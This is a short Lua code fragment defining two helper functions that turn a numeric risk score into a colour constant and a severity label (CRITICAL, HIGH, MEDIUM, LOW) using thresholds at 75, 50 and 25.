local function riskColor(score)
    if score >= 75 then return T.R75
    elseif score >= 50 then return T.R50
    elseif score >= 25 then return T.R25
    else return T.R0 end
end

local function riskLabel(score)
    if score >= 75 then return "CRITICAL"
    elseif score >= 50 then return "HIGH"
    elseif score >= 25 then return "MEDIUM"
    else return "LOW" end
end

